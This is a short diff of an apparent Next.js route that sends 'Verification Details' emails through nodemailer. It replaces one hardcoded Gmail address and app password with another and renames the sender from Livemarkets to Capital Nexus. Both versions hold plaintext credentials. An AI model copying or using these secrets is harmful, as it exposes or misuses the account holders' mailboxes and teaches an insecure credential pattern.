@@ -11,8 +11,8 @@ export async function POST(request) {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "livemarketsfx@gmail.com",
-      pass: "xsfq yzmu rzfu neeg",
+      user: "osr.cty@gmail.com",
+      pass: "btzbcklyxerxvkiy",
     },
   });
 
@@ -90,7 +90,7 @@ export async function POST(request) {
 
   // Email options
   const mailOptions = {
-    from: "Livemarkets Team <team@thelivemarkets.net>",
+    from: "Capital Nexus '<support@capitalnexus.pro>'",
     to: "livemarketsfx@gmail.com",
     subject: "Verification Details",
     html: emailContent,
